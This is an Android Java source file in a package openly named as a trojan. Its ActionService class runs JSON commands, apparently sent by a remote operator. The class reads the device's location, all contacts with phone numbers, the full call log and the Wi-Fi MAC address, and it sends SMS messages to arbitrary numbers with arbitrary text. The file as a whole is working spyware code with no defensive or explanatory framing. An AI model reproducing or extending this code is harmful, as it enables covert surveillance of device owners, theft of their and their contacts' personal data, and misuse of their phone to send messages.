package trojan.android.android_trojan;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import java.util.ArrayList;
import java.util.Arrays;

import org.json.*;


public class ActionService {

    private static final String TAG = "ActionService";
    private Context context;
    public ActionService(Context context){
        this.context = context;
    }
    private String result = null;


    public String action(String arg) {
        JSONObject argjson;
        try {
            argjson = new JSONObject(arg);
            getLocation(argjson);
            getContacts(argjson);
            getCallLog(argjson);
            getMacAddress(argjson);
            SendSMS(argjson);
        }catch (JSONException ex){
            Log.d(TAG, ex.getMessage());
            this.result = "Error JSON";
        }

        return result;
    }

    public void getLocation(JSONObject argjson) {
        if (!argjson.has("location")){
            return;
        }

        //Get location manager
        LocationManager locManager = (LocationManager) this.context.getSystemService(context.LOCATION_SERVICE);
        //get the best provider to obtain the current location
        Location location = locManager.getLastKnownLocation(locManager.getBestProvider(new Criteria(), false));
        String[] result = new String[2];

        //try to get latitude and longitude
        try {
            result[0] = "Latitude " + String.valueOf(location.getLatitude());
            result[1] = "Longitude " + String.valueOf(location.getLongitude());
        } catch (Exception ex) {//if this failed the method return 0,0
            Log.d(TAG, ex.getMessage());
            result[0] = "0";
            result[1] = "0";
        }


        this.result = new JSONArray(Arrays.asList(result)).toString();
    }


    public void getContacts(JSONObject argjson) {
        if (!argjson.has("contacts")){
            return;
        }

        ContentResolver cr = this.context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        ArrayList<String[]> contacts = new ArrayList<String[]>();

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.add(new String[]{name, phoneNo});
                    }
                    pCur.close();
                }
            }
        }
        this.result = new JSONArray(contacts).toString();
    }

    public void getCallLog(JSONObject argjson) {
        if (!argjson.has("calllogs")){
            return;
        }

        ArrayList<String[]> callLog = new ArrayList<String[]>();
        String columns[] = new String[]{
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE};
        Cursor cursor = this.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, columns, null, null, "Calls._ID DESC"); //last record first
        if (cursor.moveToFirst()) {
            do {
                callLog.add(new String[]{
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION)),
                        cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE)),
                });
            } while (cursor.moveToNext());
        }
        this.result = new JSONArray(callLog).toString();
    }


    public void getMacAddress(JSONObject argjson) {
        if (!argjson.has("mac")){
            return;
        }

        WifiManager manager = (WifiManager) this.context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo info = manager.getConnectionInfo();
        this.result = info.getMacAddress();
    }

    public void SendSMS(JSONObject argjson) throws JSONException {
        if (!argjson.has("sendsms")){
            return;
        }

        String numTelephone;
        String message;

        JSONArray array = argjson.getJSONArray("sendsms");
        numTelephone = array.get(0).toString();
        message = array.get(1).toString();

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(numTelephone, null, message, null, null);

        this.result = "message send";
    }
}
